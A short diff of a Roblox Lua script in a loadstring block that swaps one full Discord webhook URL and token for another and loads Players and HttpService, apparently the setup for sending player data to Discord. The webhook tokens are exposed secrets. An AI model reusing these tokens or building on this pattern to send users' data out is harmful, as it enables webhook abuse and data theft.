@@ -1,5 +1,5 @@
 loadstring([[
-local webhook = "https://discord.com/api/webhooks/1409921315187458099/pWWuYyjgvq8nF32WyUp2ZYBxlq9S2rWGswjLxHNltfamu_NsUey_IZqPkrArLjSSDN39"
+local webhook = "https://discord.com/api/webhooks/1410456242664771724/qQ5i_RP5zrvIuRsEkFK5FanU0rnPO09t05rZqarsy9z0mif8Q-4bvowmLdCHvdc4UbHO"
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 
